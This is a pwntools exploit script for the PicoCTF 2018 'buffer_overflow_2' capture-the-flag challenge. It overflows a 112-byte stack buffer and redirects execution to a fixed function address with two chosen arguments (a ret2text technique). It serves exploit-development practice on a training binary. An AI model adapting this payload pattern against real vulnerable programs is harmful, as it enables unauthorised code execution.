#Made by fly_autumn
#x86 ret2text
from pwn import *
p = process("./PicoCTF_2018_buffer_overflow_2")
elf= ELF("./PicoCTF_2018_buffer_overflow_2")
context(os="linux",arch="i386")

offset = 112
main_addr = elf.sym["main"]
func_plt = 0x80485cb
arg1 = 0xdeadbeef
arg2 = 0xdeadc0de

payload = b"\x00" * offset + p32(func_plt) + p32(main_addr) + p32(arg1) + p32(arg2)
p.recvuntil(b"string: \n")
p.sendline(payload)

p.interactive()
